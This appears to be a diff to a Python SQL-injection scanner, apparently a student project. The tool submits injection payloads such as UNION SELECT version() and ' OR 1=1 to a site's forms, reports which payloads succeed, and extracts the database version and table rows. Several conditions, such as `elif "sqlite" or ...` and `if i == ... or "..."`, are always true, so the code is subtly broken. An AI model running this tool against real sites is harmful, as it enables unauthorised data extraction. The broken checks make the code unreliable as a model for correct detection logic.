@@ -16,7 +16,11 @@ def is_valid_url(url):
     return bool(parsed.netloc) and bool(parsed.scheme)
 
 def get_forms(url):
-    response = requests.get(url)
+    try:
+        response = requests.get(url)
+    except:
+        print("Error: connection to the url")
+        sys.exit(1)
     soup = BeautifulSoup(response.content, "html.parser")
     return soup.find_all("form")
 
@@ -49,8 +53,6 @@ def ft_check_db(response):
             database = "MySQL"
         elif "sqlite" or ": syntax error" or "unrecognized token" in response.content.decode().lower():
             database = "SQLite"
-        elif "microsoft sql server" in response.content.decode().lower():
-            database = "SQL Server"
         if database != 'Not found':
             database_found = "True"
         if database_found == 'True':
@@ -90,7 +92,8 @@ def submit_form(form_details, url, payload, method):
 
 def ft_injection_sql(url, method, form):
     result = {
-        "payloads": []
+        "payloads": [],
+        "database_version":None
     }
     for p_type in payloadsList:
         for i in payloadsList[p_type]:
@@ -100,25 +103,56 @@ def ft_injection_sql(url, method, form):
             if not vulnerabilities:
                 vulnerabilite_indicator = [
                     "another", "table", "information_schema.tables", "information_schema.columns",
-                    "version()", "database()", "user()", "@@version", "group_concat", "table_schema", "ID"
+                    "version()", "database()", "user()", "@@version", "group_concat", "table_schema", "ID:", "succesfully logged in."
                 ]
                 for indicator in vulnerabilite_indicator:
                     if indicator.lower() in response.content.decode().lower():
+                        print("Vulnerability located with  \033[91m{}.\033[0m".format(i))
                         result["payloads"].append({
                             "payload": i,
                             "response": response.text
                         })
+                        break
+                if i == "' UNION SELECT null, null, version(), null##" or "' UNION SELECT sqlite_version(), NULL, NULL, NULL--":
+                    if "-mariadb-" in response.content.decode().lower():
+                        result["database_version"] = extract_version(response.content.decode())
+                if i == "' OR 1=1##" or "' OR 1=1--":
+                    if "ID:" in response.content.decode():
+                        table_data = extract_table_from_response(response.content.decode())
+                        if table_data:
+                            result["table"] = table_data
+
     return result
+
+def extract_version(response_content):
+    # Implement a method to extract the version from the response content
+    version_indicators = ["version:", "version", "mysql", "mariadb", "sqlite", "sql server"]
+    for line in response_content.split('\n'):
+        for indicator in version_indicators:
+            if indicator in line.lower():
+                # Extract the version number from the line
+                return line.strip()
+    return "Unknown"
+
+def extract_table_from_response(response):
+    table_data = []
+    table_indicators = ["id:"]
+    for line in response.split('\n'):
+        for indicator in table_indicators:
+            if indicator in line.lower():
+                # Extract the version number from the line
+                table_data.append(line.strip())
+    return table_data
 
 def detect_sql_injection(url, payloads, method):
     forms = get_forms(url)
     results = {
         "url": url,
-        "vulnerable": False,
-        "payloads": [],
-        "database_name": None,
+        "databases": [],
         "database_version": None,
-        "databases": []
+        "vulnerable": False,
+        "table": [],
+        "payloads": [],
     }
 
     for form in forms:
@@ -127,7 +161,6 @@ def detect_sql_injection(url, payloads, method):
             method = method.upper()  # Convertit la méthode en majuscules
             response = submit_form(form_details, url, payload, method)
             vulnerabilities = ft_check_vulnerable(response, results)
-            print(payload)
             if vulnerabilities:
                 results["vulnerable"] = True
                 results["payloads"].append({
@@ -137,6 +170,12 @@ def detect_sql_injection(url, payloads, method):
                 resultsqlinjection = ft_injection_sql(url, method, form)
                 if "payloads" in results and "payloads" in resultsqlinjection:
                     results["payloads"].extend(resultsqlinjection["payloads"])
+                if "database_version" in resultsqlinjection:
+                    results["database_version"] = resultsqlinjection["database_version"]
+                if "table" in resultsqlinjection:
+                    results["table"] = resultsqlinjection["table"]
+                if results["vulnerable"]:
+                    break
         if results["vulnerable"]:
             break
 
@@ -146,10 +185,23 @@ def save_results(results, output_file):
     with open(output_file, 'w') as f:
         json.dump(results, f, indent=4)
 
+def adjust_arguments():
+    new_args = []
+    for arg in sys.argv[1:]:
+        if arg.startswith('-oX'):
+            new_args.append('-o')
+            new_args.append('default_archive')
+            new_args.append('-X')
+            new_args.append('GET')
+        else:
+            new_args.append(arg)
+    return new_args
+
 def main():
+    sys.argv[1:] = adjust_arguments()
     parser = argparse.ArgumentParser(description='Test for SQL injection vulnerabilities.')
     parser.add_argument('url', type=str, help='URL to test')
-    parser.add_argument('-o', type=str, default='default_archive.json', help='Output file (default: default_archive.json)')
+    parser.add_argument('-o', type=str, default='default_archive', help='Output file (default: default_archive)')
     parser.add_argument('-X', type=str, default='GET', choices=['GET', 'POST'], help='HTTP method to use (default: GET)')
 
     args = parser.parse_args()
@@ -168,12 +220,6 @@ def main():
 
     if results["vulnerable"]:
         print("The site is vulnerable to SQL injection.")
-        if results["database_name"]:
-            print(f"Database name: {results['database_name']}")
-        if results["database_version"]:
-            print(f"Database version: {results['database_version']}")
-        if results["databases"]:
-            print(f"Databases: {', '.join(results['databases'])}")
     else:
         print("The site is not vulnerable to SQL injection.")
 
